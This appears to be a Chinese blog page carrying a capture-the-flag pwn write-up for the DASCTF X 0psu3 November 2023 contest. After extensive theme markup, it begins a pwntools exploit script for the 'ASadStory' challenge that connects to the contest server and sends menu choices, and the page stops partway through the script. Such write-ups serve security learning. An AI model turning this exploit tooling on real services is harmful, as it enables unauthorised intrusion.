<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="zh-CN" data-mode="dark">
  <head>
  <style>
    #canvas-dust {
      z-index: -65536;
      pointer-events: none;
      position: fixed;
      top: 0;
      left: 0;
    }
  </style>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" >
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups" />
<meta name="author" content="imLZH1" />
<meta property="og:locale" content="zh_CN" />
<meta name="description" content="‍" />
<meta property="og:description" content="‍" />
<link rel="canonical" href="http://localhost:4000/posts/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E8%B6%8A%E8%89%B0%E5%B7%A8-%E8%B6%8A%E7%8B%82%E7%83%AD-pwn-Writeups/" />
<meta property="og:url" content="http://localhost:4000/posts/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E8%B6%8A%E8%89%B0%E5%B7%A8-%E8%B6%8A%E7%8B%82%E7%83%AD-pwn-Writeups/" />
<meta property="og:site_name" content="imLZH1’ Blog" />
<meta property="og:image" content="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/log.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-11-25T20:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/log.png" />
<meta property="twitter:title" content="2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"imLZH1"},"dateModified":"2023-11-25T20:00:00+08:00","datePublished":"2023-11-25T20:00:00+08:00","description":"‍","headline":"2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups","image":"/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/log.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E8%B6%8A%E8%89%B0%E5%B7%A8-%E8%B6%8A%E7%8B%82%E7%83%AD-pwn-Writeups/"},"url":"http://localhost:4000/posts/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E8%B6%8A%E8%89%B0%E5%B7%A8-%E8%B6%8A%E7%8B%82%E7%83%AD-pwn-Writeups/"}</script>
<!-- End Jekyll SEO tag -->


  <title>2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups | imLZH1' Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="imLZH1' Blog">
<meta name="application-name" content="imLZH1' Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    

    <link rel="stylesheet" href="/assets/lib/fonts/main.css">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="/assets/lib/bootstrap/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/lib/fontawesome-free/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="/assets/lib/tocbot/tocbot.min.css">
  

  
    <link rel="stylesheet" href="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="/assets/lib/magnific-popup/magnific-popup.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<canvas id="canvas-dust"></canvas>
<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/tx.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">imLZH1' Blog</a>
    </h1>
    <!--
    <p class="site-subtitle fst-italic mb-0"></p>
    -->
    <p id="copywriting" class="site-subtitle fst-italic mb-0"></p>

    <script text="javascript">
          fetch('/assets/index_about.json',{headers:({
            'copywriting.jsion': 'application/x-www-form-urlencoded'
          })})
          .then(function(response) {
            return response.json();
          })
          .then(function(myJson) {
            var max = myJson.length;
            var copywritingId = Math.ceil(Math.random()*max)-1;
            console.log(`%c
      _    _.--.____.--._
     ( )=.-":;:;:;;':;:;:;"-._
      \\\\:;:;:;:;:;;:;::;:;:;:\\
       \\\\:;:;:;:;:;;:;:;:;:;:;\\
        \\\\:;::;:;:;:;:;::;:;:;:\\
         \\\\:;:;:;:;:;;:;::;:;:;:\\
          \\\\:;::;:;:;:;:;::;:;:;:\\
           \\\\;;:;:_:--:_:_:--:_;:;\\
            \\\\_.-"             "-._\\
             \\\\
              \\\\
               \\\\
                \\\\
                 \\\\
                  \\\\\ `,'color: #03A9F4; font-weight: bold');
            console.log(`%c `+myJson[copywritingId], `color: #03A9F4; font-weight: bold`);
            document.getElementById('copywriting').innerHTML = myJson[copywritingId];
          });
          </script>
	<script>
		'use strict';
		function getElement(string, item = document.documentElement) {
		    let tmp = item.querySelector(string);
		    if (tmp === null) {
			throw new Error("Unknown HTML");
		    }
		    return tmp;
		}
		function getParent(item, level = 1) {
		    while (level--) {
			let tmp = item.parentElement;
			if (tmp === null) {
			    throw new Error("Unknown HTML");
			}
			item = tmp;
		    }
		    return item;
		}
		function format(format, ...args) {
		    return format.replaceAll(/\$\*?[0-9]*/g, (match) => {
			if (match === '$*') {
			    return '';
			}
			let Index = match.slice(1);
			if (Index >= args.length) {
			    return '';
			}
			return args[Index];
		    });
		}
		class dust {
		    constructor(x = 50, y = 50) {
			this.vx = Math.random() * 1 + 1;
			this.vy = Math.random() * 1 + 0.01;
			this.shadowBlur = Math.random() * 3;
			this.shadowX = (Math.random() * 2) - 1;
			this.shadowY = (Math.random() * 2) - 1;
			this.radiusX = Math.random() * 1.5 + 0.5;
			this.radiusY = this.radiusX * (Math.random() * (1.3 - 0.3) + 0.3);
			this.rotation = Math.PI * Math.floor(Math.random() * 2);
			this.x = x;
			this.y = y;
		    }
		}
		class canvasDust {
		    constructor(canvasID) {
			this.color = '#fff';
			this.width = 300;
			this.height = 300;
			this.dustQuantity = 50;
			this.dustArr = [];
			this.inStop = false;
			this.build = () => {
			    this.resize();
			    if (this.ctx) {
				const point = canvasDust.getPoint(this.dustQuantity);
				for (let i of point) {
				    const dustObj = new dust(i[0], i[1]);
				    this.buildDust(dustObj);
				    this.dustArr.push(dustObj);
				}
				requestAnimationFrame(this.paint);
			    }
			};
			this.paint = () => {
			    if (this.inStop) {
				return;
			    }
			    const dustArr = this.dustArr;
			    for (let i of dustArr) {
				this.ctx.clearRect(i.x - 6, i.y - 6, 12, 12);
				if (i.x < -5 || i.y < -5) {
				    const x = this.width;
				    const y = Math.floor(Math.random() * window.innerHeight);
				    i.x = x;
				    i.y = y;
				}
				else {
				    i.x -= i.vx;
				    i.y -= i.vy;
				}
			    }
			    for (let i of dustArr) {
				this.buildDust(i);
			    }
			    requestAnimationFrame(this.paint);
			};
			this.buildDust = (dust) => {
			    const ctx = this.ctx;
			    ctx.beginPath();
			    ctx.shadowBlur = dust.shadowBlur;
			    ctx.shadowOffsetX = dust.shadowX;
			    ctx.shadowOffsetY = dust.shadowY;
			    ctx.ellipse(dust.x, dust.y, dust.radiusX, dust.radiusY, dust.rotation, 0, Math.PI * 2);
			    ctx.closePath();
			    ctx.fill();
			};
			this.resize = () => {
			    const canvas = this.canvas;
			    const width = window.innerWidth;
			    const height = window.innerHeight;
			    this.width = width;
			    this.height = height;
			    this.dustQuantity = Math.floor((width + height) / 38);
			    canvas.width = width;
			    canvas.height = height;
			    this.ctx.shadowColor =
				this.ctx.fillStyle = this.color;
			};
			this.stop = () => {
			    this.inStop = true;
			};
			this.play = () => {
			    if (this.inStop === true) {
				this.inStop = false;
				requestAnimationFrame(this.paint);
			    }
			};
			const canvas = getElement(canvasID);
			this.canvas = canvas;
			this.ctx = this.canvas.getContext('2d');
			this.build();
			window.addEventListener('resize', this.resize);
		    }
		}
		canvasDust.getPoint = (number = 1) => {
		    let point = [];
		    for (let i = 0; i < number; ++i) {
			const x = Math.floor(Math.random() * window.innerWidth);
			const y = Math.floor(Math.random() * window.innerHeight);
			point.push([x, y]);
		    }
		    return point;
		};
		try {
		    var canvasDusts = new canvasDust('#canvas-dust');
		}
		catch (e) { }
	  </script>	
	  


  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>首页</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>归档</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>关于</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/Friends/" class="nav-link">
            <i class="fa-fw fas fa-user-friends"></i>
            

            <span>FRIENDS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/imLZH1"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github-alt"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['qingwachong','qq.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                首页
              </a>
            </span>

          
        
          
        
          
            
              <span>2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      文章
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="搜索..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">取消</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        发表于
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1700913600"
  data-df="YYYY/MM/DD"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  2023/11/25
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/log.png" class="popup img-link preview-img shimmer"><img src="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/log.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          作者

          <em>
            
              
                
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2249 字"
>
  <em>12 分钟</em>阅读</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <p>‍</p>

<p>‍
DASCTF X CBCTF 2023｜无畏者先行</p>

<p>‍</p>

<p>‍</p>

<h2 id="pwn-asadstory"><span class="me-2">Pwn-ASadStory</span><a href="#pwn-asadstory" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<ul>
  <li>保护</li>
</ul>

<p>​<a href="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231125140211-k31puis.png" class="popup img-link  shimmer"><img src="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231125140211-k31puis.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>沙箱</li>
</ul>

<p>​<a href="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231125140300-m9k82ht.png" class="popup img-link  shimmer"><img src="/assets/img/2023-CTFWP-images/2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups/assets/image-20231125140300-m9k82ht.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>exploit</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">../challenge</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">node4.buuoj.cn</span><span class="sh">'</span><span class="p">,</span><span class="mi">27797</span><span class="p">)</span>


<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">1.yes / 2.no</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">: </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">your choice: </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
